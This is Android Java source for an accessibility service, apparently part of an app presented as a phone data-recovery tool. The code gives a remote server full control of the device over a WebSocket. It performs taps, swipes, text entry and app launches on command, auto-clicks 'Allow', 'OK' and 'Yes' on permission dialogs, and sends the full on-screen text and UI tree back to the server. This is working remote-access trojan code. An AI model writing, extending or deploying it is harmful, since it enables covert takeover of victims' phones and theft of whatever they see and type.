package com.recoverdata.phone.accessibility;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.content.Intent;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;

import com.recoverdata.phone.network.MessageProtocol;
import com.recoverdata.phone.network.WebSocketManager;
import com.recoverdata.phone.utils.Logger;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * AutoPilotService
 * ============================================================
 * Accessibility Service للتحكم الكامل بالهاتف عن بُعد.
 *
 * الوظائف الرئيسية:
 *   1. تنفيذ الأوامر الواردة من السيرفر.
 *   2. التنقل بين الشاشات.
 *   3. الموافقة التلقائية على حوارات النظام.
 *   4. قراءة شجرة الواجهة.
 *   5. البقاء حياً بشكل دائم.
 * ============================================================
 */
public class AutoPilotService extends AccessibilityService {

    // =============================================================
    // 1. الثوابت
    // =============================================================
    private static final String TAG = "AutoPilotService";

    // أزرار النظام
    public static final String ACTION_HOME        = "HOME";
    public static final String ACTION_BACK        = "BACK";
    public static final String ACTION_RECENTS     = "RECENTS";
    public static final String ACTION_NOTIF       = "NOTIFICATIONS";
    public static final String ACTION_LOCK        = "LOCK_SCREEN";

    // التفاعل
    public static final String ACTION_CLICK       = "CLICK";
    public static final String ACTION_LONG_CLICK  = "LONG_CLICK";
    public static final String ACTION_SWIPE       = "SWIPE";
    public static final String ACTION_TEXT        = "INPUT_TEXT";
    public static final String ACTION_SCROLL      = "SCROLL";
    public static final String ACTION_FIND_CLICK  = "FIND_CLICK";

    // القراءة
    public static final String ACTION_DUMP_UI     = "DUMP_UI";
    public static final String ACTION_GET_PKG     = "GET_PACKAGE";

    // الأتمتة
    public static final String ACTION_OPEN_APP    = "OPEN_APP";
    public static final String ACTION_OPEN_SETTINGS = "OPEN_SETTINGS";
    public static final String ACTION_ALLOW_PERM  = "ALLOW_PERM";

    // أزمنة
    private static final long LONG_CLICK_DURATION_MS = 800;
    private static final long DEFAULT_GESTURE_DURATION_MS = 300;
    private static final long GESTURE_WAIT_TIMEOUT_MS = 3000;

    // =============================================================
    // 2. الحقول
    // =============================================================
    private static AutoPilotService instance;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final AtomicBoolean isReady = new AtomicBoolean(false);

    private WebSocketManager webSocketManager;

    // =============================================================
    // 3. دورة الحياة
    // =============================================================
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        Logger.i(TAG, "AutoPilotService created");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Logger.i(TAG, "AutoPilotService connected");

        // إعداد الخدمة
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
                | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                | AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY;
        info.notificationTimeout = 100;
        setServiceInfo(info);

        isReady.set(true);

        // إبلاغ السيرفر
        notifyServer("AUTOPILOT_READY", null);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // لا نتدخل في الأحداث حالياً
    }

    @Override
    public void onInterrupt() {
        Logger.w(TAG, "AutoPilotService interrupted");
    }

    @Override
    public boolean onUnbind(Intent intent) {
        Logger.w(TAG, "AutoPilotService unbound");
        isReady.set(false);
        instance = null;
        return super.onUnbind(intent);
    }

    @Override
    public void onDestroy() {
        Logger.w(TAG, "AutoPilotService destroyed");
        isReady.set(false);
        instance = null;
        super.onDestroy();
    }

    // =============================================================
    // 4. الوصول من الخارج
    // =============================================================
    @Nullable
    public static AutoPilotService getInstance() {
        return instance;
    }

    public static boolean isReady() {
        return instance != null && instance.isReady.get();
    }

    public void setWebSocketManager(WebSocketManager manager) {
        this.webSocketManager = manager;
        Logger.i(TAG, "WebSocketManager linked");
    }

    // =============================================================
    // 5. نقطة الدخول للأوامر
    // =============================================================
    public CommandResult execute(@NonNull String action, @Nullable JSONObject params) {
        if (!isReady.get()) {
            return CommandResult.error("Service not ready");
        }

        try {
            switch (action) {
                // أزرار النظام
                case ACTION_HOME:
                    return performGlobal(AccessibilityService.GLOBAL_ACTION_HOME);
                case ACTION_BACK:
                    return performGlobal(AccessibilityService.GLOBAL_ACTION_BACK);
                case ACTION_RECENTS:
                    return performGlobal(AccessibilityService.GLOBAL_ACTION_RECENTS);
                case ACTION_NOTIF:
                    return performGlobal(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS);
                case ACTION_LOCK:
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        return performGlobal(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
                    }
                    return CommandResult.error("Lock requires API 28+");

                // التفاعل
                case ACTION_CLICK:
                    return handleClick(params, false);
                case ACTION_LONG_CLICK:
                    return handleClick(params, true);
                case ACTION_SWIPE:
                    return handleSwipe(params);
                case ACTION_TEXT:
                    return handleInputText(params);
                case ACTION_SCROLL:
                    return handleScroll(params);
                case ACTION_FIND_CLICK:
                    return handleFindAndClick(params);

                // القراءة
                case ACTION_DUMP_UI:
                    return handleDumpUI();
                case ACTION_GET_PKG:
                    return handleGetPackage();

                // الأتمتة
                case ACTION_OPEN_APP:
                    return handleOpenApp(params);
                case ACTION_OPEN_SETTINGS:
                    return handleOpenSettings(params);
                case ACTION_ALLOW_PERM:
                    return handleAllowPermission();

                default:
                    return CommandResult.error("Unknown action: " + action);
            }
        } catch (Exception e) {
            Logger.e(TAG, "execute error: " + e.getMessage(), e);
            return CommandResult.error("Exception: " + e.getMessage());
        }
    }

    // =============================================================
    // 6. تنفيذ الإجراءات
    // =============================================================

    private CommandResult performGlobal(int globalAction) {
        boolean ok = performGlobalAction(globalAction);
        return ok ? CommandResult.success("Global action performed")
                  : CommandResult.error("Global action failed");
    }

    private CommandResult handleClick(@Nullable JSONObject params, boolean isLong) {
        if (params == null) return CommandResult.error("Missing params");

        try {
            float x = (float) params.optDouble("x", -1);
            float y = (float) params.optDouble("y", -1);

            if (x < 0 || y < 0) {
                return CommandResult.error("Invalid coordinates");
            }

            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
                return CommandResult.error("Gestures require API 24+");
            }

            Path path = new Path();
            path.moveTo(x, y);

            long duration = isLong ? LONG_CLICK_DURATION_MS : 50;

            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, duration));

            return dispatchGestureSync(builder.build(),
                    isLong ? "Long click done" : "Click done");

        } catch (Exception e) {
            return CommandResult.error("Click error: " + e.getMessage());
        }
    }

    private CommandResult handleSwipe(@Nullable JSONObject params) {
        if (params == null) return CommandResult.error("Missing params");

        try {
            float x1 = (float) params.optDouble("x1", -1);
            float y1 = (float) params.optDouble("y1", -1);
            float x2 = (float) params.optDouble("x2", -1);
            float y2 = (float) params.optDouble("y2", -1);
            long duration = (long) params.optDouble("duration", DEFAULT_GESTURE_DURATION_MS);

            if (x1 < 0 || y1 < 0 || x2 < 0 || y2 < 0) {
                return CommandResult.error("Invalid swipe coordinates");
            }

            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
                return CommandResult.error("Gestures require API 24+");
            }

            Path path = new Path();
            path.moveTo(x1, y1);
            path.lineTo(x2, y2);

            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, duration));

            return dispatchGestureSync(builder.build(), "Swipe done");

        } catch (Exception e) {
            return CommandResult.error("Swipe error: " + e.getMessage());
        }
    }

    private CommandResult handleInputText(@Nullable JSONObject params) {
        if (params == null) return CommandResult.error("Missing params");

        String text = params.optString("text", "");
        if (text.isEmpty()) return CommandResult.error("Empty text");

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return CommandResult.error("No active window");

        // ابحث عن العنصر المُركَّز
        AccessibilityNodeInfo focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
        if (focused == null) {
            // ابحث عن أي EditText
            List<AccessibilityNodeInfo> editables = root
                    .findAccessibilityNodeInfosByViewId("android:id/edit");
            if (editables != null && !editables.isEmpty()) {
                focused = editables.get(0);
            }
        }

        if (focused == null) {
            return CommandResult.error("No input field found");
        }

        Bundle args = new Bundle();
        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);

        boolean ok = focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
        return ok ? CommandResult.success("Text input done")
                  : CommandResult.error("Failed to input text");
    }

    private CommandResult handleScroll(@Nullable JSONObject params) {
        if (params == null) return CommandResult.error("Missing params");

        String direction = params.optString("direction", "down");

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return CommandResult.error("No active window");

        int action;
        switch (direction.toLowerCase()) {
            case "up":
            case "left":
                action = AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD;
                break;
            case "down":
            case "right":
                action = AccessibilityNodeInfo.ACTION_SCROLL_FORWARD;
                break;
            default:
                return CommandResult.error("Invalid direction");
        }

        AccessibilityNodeInfo scrollable = findScrollable(root);
        if (scrollable == null) {
            return CommandResult.error("No scrollable view");
        }

        boolean ok = scrollable.performAction(action);
        return ok ? CommandResult.success("Scroll done")
                  : CommandResult.error("Scroll failed");
    }

    private CommandResult handleFindAndClick(@Nullable JSONObject params) {
        if (params == null) return CommandResult.error("Missing params");

        String text = params.optString("text", "");
        if (text.isEmpty()) return CommandResult.error("Empty search text");

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return CommandResult.error("No active window");

        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
        if (nodes == null || nodes.isEmpty()) {
            return CommandResult.error("Element not found: " + text);
        }

        for (AccessibilityNodeInfo node : nodes) {
            AccessibilityNodeInfo clickable = findClickableParent(node);
            if (clickable != null) {
                boolean ok = clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                if (ok) return CommandResult.success("Clicked: " + text);
            }
        }

        return CommandResult.error("No clickable element found for: " + text);
    }

    private CommandResult handleDumpUI() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return CommandResult.error("No active window");

        try {
            JSONObject tree = new JSONObject();
            tree.put("package", root.getPackageName());
            tree.put("nodes", dumpNode(root));

            notifyServer(MessageProtocol.EVENT_UI_TREE, tree);
            return CommandResult.success("UI tree sent");
        } catch (JSONException e) {
            return CommandResult.error("JSON error: " + e.getMessage());
        }
    }

    private CommandResult handleGetPackage() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return CommandResult.error("No active window");

        try {
            JSONObject data = new JSONObject();
            data.put("package", root.getPackageName());
            notifyServer(MessageProtocol.EVENT_CURRENT_PACKAGE, data);
            return CommandResult.success("Package sent");
        } catch (JSONException ignored) {
            return CommandResult.error("JSON error");
        }
    }

    private CommandResult handleOpenApp(@Nullable JSONObject params) {
        if (params == null) return CommandResult.error("Missing params");
        String pkg = params.optString("package", "");
        if (pkg.isEmpty()) return CommandResult.error("Empty package");

        try {
            Intent intent = getPackageManager().getLaunchIntentForPackage(pkg);
            if (intent == null) return CommandResult.error("App not found: " + pkg);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            return CommandResult.success("Opened: " + pkg);
        } catch (Exception e) {
            return CommandResult.error("Open app error: " + e.getMessage());
        }
    }

    private CommandResult handleOpenSettings(@Nullable JSONObject params) {
        String action = (params != null) ? params.optString("action", "SETTINGS") : "SETTINGS";
        try {
            Intent intent;

            switch (action.toUpperCase()) {
                case "WIFI":
                    intent = new Intent(android.provider.Settings.ACTION_WIFI_SETTINGS);
                    break;
                case "ACCESSIBILITY":
                    intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    break;
                case "APPS":
                    intent = new Intent(android.provider.Settings.ACTION_APPLICATION_SETTINGS);
                    break;
                default:
                    intent = new Intent(android.provider.Settings.ACTION_SETTINGS);
                    break;
            }

            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            return CommandResult.success("Settings opened: " + action);
        } catch (Exception e) {
            return CommandResult.error("Settings error: " + e.getMessage());
        }
    }

    private CommandResult handleAllowPermission() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return CommandResult.error("No active window");

        String[] allowTexts = {
                "Allow", "ALLOW", "السماح", "سماح", "موافق", "OK", "أوافق", "Yes", "نعم"
        };

        for (String t : allowTexts) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(t);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo node : nodes) {
                    AccessibilityNodeInfo clickable = findClickableParent(node);
                    if (clickable != null) {
                        boolean ok = clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        if (ok) return CommandResult.success("Clicked: " + t);
                    }
                }
            }
        }
        return CommandResult.error("No allow button found");
    }

    // =============================================================
    // 7. دوال مساعدة
    // =============================================================

    /**
     * تنفيذ gesture بشكل متزامن (ينتظر النتيجة).
     */
    private CommandResult dispatchGestureSync(@NonNull GestureDescription gesture,
                                              @NonNull String successMsg) {
        final CommandResult[] result = new CommandResult[1];
        final CountDownLatch latch = new CountDownLatch(1);

        boolean dispatched = dispatchGesture(gesture,
                new GestureResultCallback() {
                    @Override
                    public void onCompleted(GestureDescription gd) {
                        result[0] = CommandResult.success(successMsg);
                        latch.countDown();
                    }

                    @Override
                    public void onCancelled(GestureDescription gd) {
                        result[0] = CommandResult.error("Gesture cancelled");
                        latch.countDown();
                    }
                }, mainHandler);

        if (!dispatched) {
            return CommandResult.error("Failed to dispatch gesture");
        }

        try {
            if (!latch.await(GESTURE_WAIT_TIMEOUT_MS, TimeUnit.MILLISECONDS)) {
                return CommandResult.error("Gesture timeout");
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            return CommandResult.error("Gesture interrupted");
        }

        return result[0] != null ? result[0] : CommandResult.error("Unknown error");
    }

    @Nullable
    private AccessibilityNodeInfo findClickableParent(@Nullable AccessibilityNodeInfo node) {
        AccessibilityNodeInfo current = node;
        int depth = 0;
        while (current != null && depth < 10) {
            if (current.isClickable()) return current;
            current = current.getParent();
            depth++;
        }
        return null;
    }

    @Nullable
    private AccessibilityNodeInfo findScrollable(@Nullable AccessibilityNodeInfo root) {
        if (root == null) return null;
        if (root.isScrollable()) return root;

        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo child = root.getChild(i);
            AccessibilityNodeInfo found = findScrollable(child);
            if (found != null) return found;
        }
        return null;
    }

    @NonNull
    private JSONArray dumpNode(@Nullable AccessibilityNodeInfo node) {
        JSONArray arr = new JSONArray();
        if (node == null) return arr;

        try {
            JSONObject obj = new JSONObject();
            obj.put("class", safeStr(node.getClassName()));
            obj.put("text", safeStr(node.getText()));
            obj.put("desc", safeStr(node.getContentDescription()));
            obj.put("id", safeStr(node.getViewIdResourceName()));
            obj.put("clickable", node.isClickable());
            obj.put("scrollable", node.isScrollable());
            obj.put("editable", node.isEditable());
            obj.put("enabled", node.isEnabled());

            Rect bounds = new Rect();
            node.getBoundsInScreen(bounds);
            obj.put("bounds", bounds.flattenToString());

            JSONArray children = new JSONArray();
            for (int i = 0; i < node.getChildCount() && i < 30; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    JSONArray childArr = dumpNode(child);
                    for (int j = 0; j < childArr.length(); j++) {
                        children.put(childArr.get(j));
                    }
                }
            }
            obj.put("children", children);
            arr.put(obj);
        } catch (JSONException ignored) {}

        return arr;
    }

    private String safeStr(@Nullable CharSequence cs) {
        return cs == null ? "" : cs.toString();
    }

    private void notifyServer(@NonNull String event, @Nullable JSONObject data) {
        if (webSocketManager == null) return;

        try {
            JSONObject msg = new JSONObject();
            msg.put("type", "EVENT");
            msg.put("event", event);
            if (data != null) msg.put("data", data);
            msg.put("timestamp", System.currentTimeMillis());

            webSocketManager.send(msg.toString());
        } catch (JSONException e) {
            Logger.e(TAG, "notifyServer error", e);
        }
    }

    // =============================================================
    // 8. كلاس النتيجة
    // =============================================================
    public static class CommandResult {
        public final boolean success;
        public final String message;

        private CommandResult(boolean success, String message) {
            this.success = success;
            this.message = message;
        }

        public static CommandResult success(String message) {
            return new CommandResult(true, message);
        }

        public static CommandResult error(String message) {
            return new CommandResult(false, message);
        }

        @Override
        @NonNull
        public String toString() {
            return (success ? "✅ " : "❌ ") + message;
        }
    }
}
